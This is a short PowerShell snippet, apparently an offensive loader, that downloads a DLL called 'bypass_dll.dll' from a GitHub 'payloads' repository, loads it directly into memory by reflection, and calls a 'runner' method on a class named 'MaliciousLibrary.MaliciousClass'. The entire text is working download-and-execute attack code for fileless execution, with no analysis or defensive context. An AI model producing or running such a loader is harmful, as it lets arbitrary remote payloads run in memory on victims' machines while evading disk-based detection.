$data = (New-Object System.Net.WebClient).DownloadData('https://github.com/far-light/payloads/raw/main/bypass_dll.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("MaliciousLibrary.MaliciousClass")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
